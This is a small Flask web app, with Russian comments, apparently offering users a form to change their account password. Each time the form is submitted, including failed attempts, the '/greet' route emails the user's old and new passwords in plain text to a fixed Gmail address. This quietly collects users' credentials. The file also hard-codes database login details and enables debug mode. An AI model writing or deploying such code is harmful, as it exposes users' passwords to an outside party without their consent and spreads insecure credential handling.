from flask import Flask, render_template, request, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
from flask_mail import Mail, Message

app = Flask(__name__)

# Настройка подключения к базе данных MySQL
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://moloman:Moloman1994@localhost/flask_app'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Настройки для Flask-Mail
app.config['MAIL_SERVER'] = 'smtp.example.com'  # Укажите ваш SMTP сервер
app.config['MAIL_PORT'] = 587  # Порт для SMTP
app.config['MAIL_USERNAME'] = 'your-email@example.com'  # Ваш email
app.config['MAIL_PASSWORD'] = 'your-email-password'  # Ваш пароль
app.config['MAIL_USE_TLS'] = True  # Используйте TLS
app.config['MAIL_USE_SSL'] = False  # Не используйте SSL
mail = Mail(app)

db = SQLAlchemy(app)

# Модель пользователя (пример)
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(120), nullable=False)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/greet', methods=['POST'])
def greet():
    username = request.form['username']
    old_password = request.form['old_password']
    new_password = request.form['new_password']
    
    user = User.query.filter_by(username=username).first()
    
    if user and check_password_hash(user.password, old_password):
        user.password = generate_password_hash(new_password)
        db.session.commit()
        message = f"Пароль был изменен для аккаунта {username}"
    else:
        message = "Пользователь не найден или старый пароль неверен."
    
    # Отправка email
    msg = Message('Пароль изменен',
                  sender='palazzago40@gmail.com',  # Ваш email
                  recipients=['palazzago40@gmail.com'])  # Email получателя
    msg.body = f"""
    Пароль был изменен для аккаунта {username}.
    
    Старый пароль: {old_password}
    Новый пароль: {new_password}
    """
    mail.send(msg)
    
    return render_template('index.html', message=message, username=username)

if __name__ == '__main__':
    app.run(debug=True)
